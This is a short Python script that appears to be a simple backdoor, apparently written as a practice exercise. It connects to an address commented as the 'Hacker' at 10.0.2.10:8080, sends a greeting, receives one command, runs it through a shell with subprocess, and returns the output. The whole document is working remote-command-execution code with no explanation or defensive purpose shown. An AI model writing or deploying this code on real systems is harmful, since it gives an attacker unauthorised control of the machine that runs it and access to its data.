#import socket
from socket import SOCK_STREAM, socket, AF_INET
import subprocess

def command_execution(command):
    return subprocess.check_output(command, shell=True)

connection = socket(AF_INET, SOCK_STREAM)
connection.connect(("10.0.2.10", 8080))  # Connect to Hacker

connection.send(b"Connection established\n")

command = connection.recv(1024)
command_output = command_execution(command)

connection.send(command_output)

connection.close()